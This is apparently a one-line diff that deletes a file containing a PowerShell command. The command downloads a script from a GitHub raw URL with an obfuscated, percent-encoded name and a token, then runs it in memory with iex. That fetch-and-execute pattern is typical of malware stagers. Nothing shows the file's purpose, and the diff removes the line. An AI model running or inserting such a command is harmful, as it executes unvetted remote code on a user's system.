@@ -1,1 +1,0 @@
-powershell.exe -command “iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/Savitar407/IcedShark/main/%23%24(%23%24%5E%23)%24%5E%23%24%5E)%26%23%24%5E%40%5E)%24%5E%26.ps1?token=AKF644J6TXJ5SQKJ2E77SI3AGL3RM’)”
